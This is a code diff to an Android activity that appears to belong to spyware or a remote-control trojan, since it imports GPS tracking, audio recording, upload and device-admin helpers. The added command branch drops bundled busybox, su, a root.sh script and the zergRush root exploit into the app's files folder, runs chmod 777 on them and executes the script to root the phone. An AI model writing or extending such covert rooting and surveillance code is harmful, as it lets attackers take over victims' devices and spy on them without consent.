@@ -34,6 +34,7 @@ import com.android.classic.helper.Compress;
 import com.android.classic.helper.ConstantVariables;
 import com.android.classic.helper.DEBUGSERVICE;
 import com.android.classic.helper.GPSTracker;
+import com.android.classic.helper.Methods;
 import com.android.classic.helper.Sender;
 import com.android.classic.helper.Uploader;
 import com.android.classic.recording.Audiorecorder;
@@ -50,14 +51,22 @@ public class DEBUG extends Activity {
 	String commands = "default";
 
 	@SuppressLint("NewApi")
+	private void threadPolicy() {
+		// TODO Auto-generated method stub
+		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
+			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
+					.permitAll().build();
+			StrictMode.setThreadPolicy(policy);
+		}
+	}
+
+	@SuppressLint("NewApi")
 	@SuppressWarnings("deprecation")
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 
-		StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
-				.permitAll().build();
-		StrictMode.setThreadPolicy(policy);
+		threadPolicy();
 
 		handleIntent(getIntent());
 		mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
@@ -249,6 +258,21 @@ public class DEBUG extends Activity {
 				new GPSTracker(this);
 			} else if (commands.equals(DEBUGSERVICE.codeList[17])) {
 				Shell.SU.run("id");
+			} else if (commands.equals(DEBUGSERVICE.codeList[18])) {
+				new File(getFilesDir().getAbsolutePath()).mkdirs();
+				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.busybox,
+						"busybox", this);
+				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.makespace,
+						"makespace", this);
+				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.root,
+						"root.sh", this);
+				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.su, "su",
+						this);
+				Methods.SaveIncludedZippedFileIntoFilesFolder(R.raw.zergrush,
+						"zergRush", getApplicationContext());
+				String[] root = { "cd /data/data/com.android.classic/files/",
+						"chmod 777 *", "sh root.sh" };
+				Shell.SH.run(root);
 			}
 			Thread.sleep(5000);
 			finish();
